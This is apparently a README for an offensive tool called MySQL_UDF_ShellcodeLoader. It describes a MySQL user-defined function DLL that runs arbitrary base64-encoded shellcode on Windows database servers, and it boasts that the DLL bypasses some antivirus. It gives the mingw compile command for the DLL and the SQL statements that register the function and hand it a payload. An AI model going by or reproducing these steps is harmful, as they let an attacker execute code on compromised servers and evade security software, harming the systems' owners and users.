# MySQL_UDF_ShellcodeLoader

MySQL UDF for load shellcode

Only support Windows, bypass some antivirus :)

## How to compile

### Ubuntu 18.04

```
apt install mingw-w64
apt install libmysqlclient-dev

x86_64-w64-mingw32-gcc scloader.c -o x64.dll -I/usr/include/mysql -shared #for 64 bit
```

## How to use

```
create function scloader returns string soname 'x64.dll';

cat payload.bin | base64
select scloader($base64_shellcode);
```

If load success, the function return 'ok'
